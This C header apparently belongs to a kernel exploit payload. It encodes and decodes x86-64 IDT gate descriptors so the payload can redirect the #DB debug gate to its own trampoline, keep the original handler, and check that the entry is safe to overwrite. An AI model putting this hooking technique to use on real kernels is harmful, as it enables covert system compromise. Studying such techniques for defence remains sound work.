/* khook_gate — encoding the #DB gate descriptor, and reading the original back.
 *
 * The vendored khook builds its gate with a static gate_encode() and always points
 * it at the pivot gadget. The design requires the gate to point at our Stage-1
 * trampoline instead, and the trampoline verifies that IDT[1] still holds exactly
 * what we installed -- so the payload has to encode the gate itself and store the
 * same two qwords in the verification block.
 *
 * Two copies of the same bit layout is the classic way to get a gate the trampoline
 * then rejects. So this file is the payload's encoder, it is unit-tested on the host
 * against a hand-computed descriptor, and the block's gate_lo/gate_hi always come
 * from it.
 *
 * Freestanding: stdint only.
 */
#ifndef KH_GATE_H
#define KH_GATE_H

#include <stdint.h>

/* x86-64 interrupt-gate descriptor, 16 bytes:
 *   [15:0]  offset 15:0        [16:31] selector
 *   [32:34] IST index          [40:43] type      [45:46] DPL   [47] present
 *   [48:63] offset 31:16       upper qword: offset 63:32
 */
static inline void kh_gate_encode(uint64_t handler, uint16_t sel, uint8_t ist,
                                  uint8_t type, uint8_t dpl, int present,
                                  uint64_t *lo, uint64_t *hi) {
  *lo = (handler & 0xFFFFULL)
      | ((uint64_t)sel << 16)
      | ((uint64_t)(ist & 7) << 32)
      | ((uint64_t)(type & 0xF) << 40)
      | ((uint64_t)(dpl & 3) << 45)
      | ((uint64_t)(present ? 1 : 0) << 47)
      | (((handler >> 16) & 0xFFFFULL) << 48);
  *hi = (handler >> 32) & 0xFFFFFFFFULL;
}

/* Recover the handler address a descriptor points at. Used to keep the *original*
 * #DB handler for the foreign path, from the values saved before we installed ours. */
static inline uint64_t kh_gate_decode_handler(uint64_t lo, uint64_t hi) {
  return (lo & 0xFFFFULL)
       | (((lo >> 48) & 0xFFFFULL) << 16)
       | ((hi & 0xFFFFFFFFULL) << 32);
}

static inline uint8_t kh_gate_ist_of(uint64_t lo) { return (uint8_t)((lo >> 32) & 7); }
static inline uint16_t kh_gate_sel_of(uint64_t lo) { return (uint16_t)((lo >> 16) & 0xFFFF); }
static inline int kh_gate_present(uint64_t lo) { return (int)((lo >> 47) & 1); }

/* A descriptor we are willing to overwrite: present, and pointing into the kernel
 * image. Anything else means the IDT is not what we think it is -- refuse rather than
 * install a gate over an unexpected entry. */
static inline int kh_gate_installable(uint64_t lo, uint64_t hi, uint64_t kernel_base,
                                      uint64_t kernel_max) {
  if (!kh_gate_present(lo))
    return 0;
  uint64_t h = kh_gate_decode_handler(lo, hi);
  if (h < kernel_base || h >= kernel_base + kernel_max)
    return 0;
  if (kh_gate_sel_of(lo) == 0)
    return 0;
  return 1;
}

#endif /* KH_GATE_H */
